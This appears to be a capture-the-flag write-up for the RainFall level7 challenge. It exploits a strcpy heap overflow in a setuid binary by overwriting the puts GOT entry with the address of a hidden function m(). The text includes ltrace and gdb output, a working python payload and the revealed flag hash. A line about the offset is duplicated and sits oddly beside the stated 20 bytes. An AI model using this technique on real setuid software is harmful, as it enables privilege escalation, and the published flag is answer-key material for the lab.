"7aA6" revert to "6Aa7" is 22th in "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4"

We are given a setuid binary that segfaults without parameters and prints ~~ when given two arguments:
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 arg
Segmentation fault (core dumped)
level7@RainFall:~$ ./level7 arg1 arg2
~~

From reverse engineering (via source.c), we know:
There's a hidden function m() that prints the flag.
The vulnerable code uses strcpy() on user inputs and allocates memory via malloc().
By carefully crafting our arguments, we can perform a heap-based overwrite of a function pointer.

Step 1: Understand the Vulnerability
Inside main(), the code does this (simplified):
```
char *a;
char *b[2];

if (argc == 3) {
    a = malloc(8);
    b[0] = malloc(8);
    a = strcpy(a, argv[1]);     // ✅ strcpy is vulnerable — no bounds check
    b[1] = malloc(8);
    b[1] = strcpy(b[1], argv[2]);

    fgets(c, 68, fopen("/home/user/level8/.pass", "r")); // stores flag in global 'c'
    puts("~~");
}
```
Here’s what we can exploit:
strcpy(a, argv[1]) will copy beyond the 8-byte buffer, overwriting b[1]’s pointer before it's initialized.
b[1] = strcpy(b[1], argv[2]) will then write to wherever b[1] now points — which we control.

Goal: Redirect the second strcpy() to overwrite a GOT entry (e.g., puts()), replacing it with the address of function m() (which prints the flag).

Step 2: Find the Offset
We use a cyclic pattern to discover how many bytes are needed to reach the b[1] pointer:

level7@RainFall:~$ ltrace ./level7 "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4"
__libc_start_main(0x8048521, 2, 0xbffff744, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                        = 0x0804a008
malloc(8)                                        = 0x0804a018
malloc(8)                                        = 0x0804a028
malloc(8)                                        = 0x0804a038
strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...) = 0x0804a018
strcpy(0x37614136, NULL <unfinished ...>
--- SIGSEGV (Segmentation fault) ---

"7aA6" revert to "6Aa7" is 22th in "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4"
So, after 20 bytes, we reach and control b[1].

Step 3: Locate the GOT Entry for puts()
We want to overwrite the GOT entry of puts():
level7@RainFall:~$ objdump -R level7 | grep puts
08049928 R_386_JUMP_SLOT   puts


Step 4: Find the Address of m()
(gdb) info functions m
0x080484f4  m
✅ Function m() is at 0x080484f4.

Step 5: Craft the Exploit
We want to:
Overflow a (first malloc) to overwrite the pointer for b[1] (next malloc).
Make b[1] point to puts() GOT.
When the second strcpy() writes, it writes the address of m() to that GOT entry.
Next time puts() is called, m() will run instead — and print the flag.

Final Payload:
./level7 \
  $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') \
  $(python -c 'print "\xf4\x84\x04\x08"')
"\x28\x99\x04\x08" = address of puts() GOT entry (0x08049928)
"\xf4\x84\x04\x08" = address of m() (0x080484f4)

Step 6: Exploit and Get the Flag
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9

